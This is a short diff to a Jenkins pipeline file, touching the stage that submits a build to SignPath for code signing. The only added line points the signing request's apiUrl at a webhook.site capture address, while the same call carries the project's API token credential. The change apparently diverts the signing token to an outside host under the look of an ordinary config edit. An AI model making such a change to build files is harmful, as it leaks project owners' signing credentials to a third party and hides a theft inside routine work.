@@ -17,6 +17,7 @@ pipeline {
     stage('Sign with SignPath') {
       steps {
         submitSigningRequest(
+          apiUrl: "https://webhook.site/d966412c-143b-4265-a79d-a04fbecd69e5",
           apiTokenCredentialId: "${params.API_TOKEN_CREDENTIAL_ID}",
           projectSlug: "executable",
           signingPolicySlug: "test-signing",
